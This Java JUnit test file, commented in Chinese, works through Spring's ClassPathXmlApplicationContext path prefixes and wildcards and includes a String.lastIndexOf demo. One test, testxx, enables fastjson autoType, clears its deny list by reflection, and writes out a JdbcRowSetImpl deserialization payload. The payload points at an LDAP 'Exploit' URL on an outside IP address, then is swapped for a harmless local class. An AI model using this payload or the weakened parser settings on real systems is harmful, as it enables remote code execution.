package com.spring_1_100.test_1_10.test;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import com.spring_1_100.test_1_10.test.service.Car;
import com.spring_1_100.test_1_10.test.service.UserService;
import org.junit.Test;
import org.springframework.beans.factory.support.DefaultSingletonBeanRegistry;
import org.springframework.context.ApplicationContext;
import org.springframework.context.support.ClassPathXmlApplicationContext;
import org.springframework.core.io.Resource;
import org.springframework.core.io.support.PathMatchingResourcePatternResolver;
import org.springframework.core.io.support.ResourcePatternResolver;

import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;

public class SpringTest1 {


    /**
     * Spring容器最基本的接口就是BeanFactory. BeanFactory负责配置、创建、管理Bean，它有一个子接口ApplicationContext,也称为Spring上下文。Spring容器负责管理Bean与Bean之间的信赖关系。
     *     BeanFactory有很多实现类，通常使用org.springframework.beans.factory.xml.XmlBeanFactory类。但对于大部分J2EE应用而言，推荐使用ApplicationContext.
     *     ApplicationContext是BeanFactory的子接口，其常用实现类是
     *     org.springframework.context.support.FileSystemXmlApplicationContext
     *     org.springframework.context.support.ClassXmlAplicationContext。
     * Springr的配置信息通常采用XML配置文件来设置，因此，创建BeanFactory实例时，应该提供XML配置文件作为参数。、
     * 下面详细介绍ApplicationContext的实际运用：
     * 一：ClassPathXmlApplicationContext
     *
     * 4.可以同时加载多个文件
     *   String[] xmlCfg = new String[] { "classpath:base.spring_test3.xml","app.spring_test3.xml"};
     *   ApplicationContext appCt = new ClassPathXmlApplicationContext(xmlCfg);
     *
     */
    /**
     * 1.没有前缀：默认为项目的classpath下相对路径
     * ApplicationContext appCt = new ClassPathXmlApplicationContext("app.spring_test3.xml");
     * 对于这种情况，我们不做源码解读
     */
    @Test
    public void test() {
        ApplicationContext ctx = new ClassPathXmlApplicationContext("spring_1_100/config_1_10/spring.xml");
        UserService userService = (UserService) ctx.getBean("userService");
        userService.query();
    }

    /**
     * 2.前缀classpath：表示的是项目的classpath下相对路径
     * ApplicationContext appCt = new ClassPathXmlApplicationContext("classpath:app.spring_test3.xml");
     */
    @Test
    public void test1() {
        ApplicationContext ctx = new ClassPathXmlApplicationContext("classpath:spring_1_100/config_1_10/spring.xml");
        UserService userService = (UserService) ctx.getBean("userService");
        userService.query();
    }


    @Test
    public void test1_1() throws Exception {
        ClassPathXmlApplicationContext ctx = new ClassPathXmlApplicationContext("classpath:spring_1_100/config_1_10/spring1_1.xml");
        // 此时获取到容器帮我们创建的bean
        Car car1 = (Car) ctx.getBean("car", "red");
        System.out.println(JSON.toJSONString(car1));
        DefaultSingletonBeanRegistry beanDefReg = (DefaultSingletonBeanRegistry) ctx.getBeanFactory();
        Method method = DefaultSingletonBeanRegistry.class.getDeclaredMethod("removeSingleton", String.class);
        System.out.println(method.getName());
        method.setAccessible(true);
        method.invoke(beanDefReg, new Object[]{"car"});
        // 容器中bean己经被删除，因此调用getBean
        Car car2 = (Car) ctx.getBean("car", "red");
        System.out.println(JSON.toJSONString(car2));
    }


    /**
     * 2.前缀classpath：表示的是项目的classpath下相对路径
     * ApplicationContext appCt = new ClassPathXmlApplicationContext("classpath:app.spring_test3.xml");
     */
    @Test
    public void test2() {
        ApplicationContext ctx = new ClassPathXmlApplicationContext("classpath*:spring_1_100/config_1_10/spring.xml");
        UserService userService = (UserService) ctx.getBean("userService");
        userService.query();
    }

    /**
     * 2.前缀classpath：表示的是项目的classpath下相对路径
     * ApplicationContext appCt = new ClassPathXmlApplicationContext("classpath:app.spring_test3.xml");
     */
    @Test
    public void test2_2() {
        ApplicationContext ctx = new ClassPathXmlApplicationContext("classpath*:spring_1_100/config_1_10/spring_test1/*.xml");
        UserService userService = (UserService) ctx.getBean("userService");
        userService.query();
    }


    @Test
    public void test2_3() {
        ApplicationContext ctx = new ClassPathXmlApplicationContext("spring_1_100/config_1_10/spring_test1/a/b/c/../../spring_test3.xml");
        UserService userService = (UserService) ctx.getBean("userService");
        userService.query();
    }

    @Test
    public void test2_4() {
        ApplicationContext ctx = new ClassPathXmlApplicationContext("classpath*:spring_1_100/**/spring_test4.xml");
        UserService userService = (UserService) ctx.getBean("userService");
        userService.query();

     /*   Dog dog = (Dog) ctx.getBean("dog");
        dog.query();*/

    }

    /**
     * 3.使用前缀file 表示的是文件的绝对路径
     * ApplicationContext appCt = new ClassPathXmlApplicationContext("file:D:/app.spring_test3.xml");
     */

    @Test
    public void test3() {
        ApplicationContext ctx = new ClassPathXmlApplicationContext("file:${user.dir}/src/main/resources/spring_1_100/config_1_10/spring_test1/a/*.xml");
        UserService userService = (UserService) ctx.getBean("userService");
        userService.query();
    }


    /**
     * 4.使用通配符加载所有符合要求的文件
     * ApplicationContext appCt = new ClassPathXmlApplicationContext("*.spring_test3.xml");
     */
    @Test
    public void test4() {
        ApplicationContext ctx = new ClassPathXmlApplicationContext("spring_1_100/config_1_10/spring_test1/*.xml");
        UserService userService = (UserService) ctx.getBean("userService");
        userService.query();
    }

    @Test
    public void test5() {
        String Str = new String("菜鸟教程:www.runoob.com");
        String SubStr1 = new String("runoob");
        String SubStr2 = new String("com");

        System.out.print("查找字符 o 最后出现的位置 :");
        System.out.println(Str.lastIndexOf('o'));
        System.out.print("从第14个位置查找字符 o 最后出现的位置 :");
        System.out.println(Str.lastIndexOf('o', 17));
        System.out.print("子字符串 SubStr1 最后出现的位置:");
        System.out.println(Str.lastIndexOf(SubStr1));
        System.out.print("从第十五个位置开始搜索子字符串 SubStr1最后出现的位置 :");
        System.out.println(Str.lastIndexOf(SubStr1, 15));
        System.out.print("子字符串 SubStr2 最后出现的位置 :");
        System.out.println(Str.lastIndexOf(SubStr2));
    }

    @Test
    public void test6() {
        ResourcePatternResolver resourcePatternResolver = new PathMatchingResourcePatternResolver();
        try {
            Resource[] metaInfResources = resourcePatternResolver.getResources("classpath*:spring_1_100/**/spring_test4.xml");
            //Resource[] metaInfResources = resourcePatternResolver.getResources("classpath:spring_1_100/**/spring_test4.xml");
            //Resource[] metaInfResources = resourcePatternResolver.getResources("spring_1_100/config_1_10/spring_test1/a/b/c/../../spring_test3.xml");
            System.out.println(metaInfResources.length);
            for (Resource r : metaInfResources) {
                System.out.println("URL:" + r.getURL());
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }





    /*
     *
     * 二：FileSystemXmlApplicationContext
     * 1.默认为项目工作路径 即项目的根目录
     * ApplicationContext appCt2 = new FileSystemXmlApplicationContext("src/main/resources/app.spring_test3.xml");
     *
     * 2.前缀classpath：表示的是项目的classpath下相对路径
     *    ApplicationContext appCt2 = new FileSystemXmlApplicationContext("classpath:app.spring_test3.xml");
     *
     * 3.使用前缀file 表示的是文件的绝对路径
     *    ApplicationContext appCt2 = new FileSystemXmlApplicationContext("file:D:/app.spring_test3.xml");
     *    ApplicationContext appCt2 = new FileSystemXmlApplicationContext("D:/app.spring_test3.xml");
     *
     * 4.可以同时加载多个文件
     *   String[] xmlCfg = new String[] { "src/main/resources/base.spring_test3.xml","classpath:app.spring_test3.xml"};
     *   ApplicationContext appCt2 = new FileSystemXmlApplicationContext(xmlCfg);
     *
     * 5.使用通配符加载所有符合要求的文件
     *   ApplicationContext appCt2 = new FileSystemXmlApplicationContext("classpath:*.spring_test3.xml");
     */






    @Test
    public void testxx(){
        ParserConfig parserConfig= ParserConfig.getGlobalInstance();
        parserConfig.setAutoTypeSupport(true);
        setFieldValue(parserConfig,"denyHashCodes",new long []{});

        String payload = "{\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"x\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://23.254.224.222:1388/Exploit\",\"autoCommit\":true}}";
        payload = "{\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.spring_1_100.test_1_10.test.TestHaha\"},\"x\":{\"@type\":\"com.spring_1_100.test_1_10.test.TestHaha\",\"dataSourceName\":\"xxxxx\",\"autoCommit\":true}}";
        Object object = JSON.parse(payload);
        System.out.println(object);

    }

    public static <T> T setFieldValue(Object target, String name, Object value) {
        Field field = getField(target.getClass(), name);
        if (field != null) {
            try {
                field.setAccessible(true);
                field.set(target, value);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return null;
    }

    public static Field getField(Class clazz, String name) {
        Field fields[] = clazz.getDeclaredFields();
        for (Field field : fields) {
            if (name.equals(field.getName())) {
                return field;
            }
        }
        return null;
    }


}



